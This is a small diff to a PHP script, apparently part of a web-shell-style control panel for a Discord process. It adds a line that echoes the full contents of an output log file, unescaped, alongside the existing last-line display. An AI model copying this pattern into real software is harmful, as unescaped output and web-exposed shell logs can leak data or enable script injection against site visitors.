@@ -242,6 +242,7 @@ if(isset($_POST["webshell_discord"])){
     
     if(filesize("./output_discord.log") > 1){
     echo "<script></script>";
+    echo fread($myfile,filesize("./output_discord.log"));
     $fewLines = explode("\n", fread($myfile,filesize("./output_discord.log")));
     echo $fewLines[count($fewLines)-1];
     
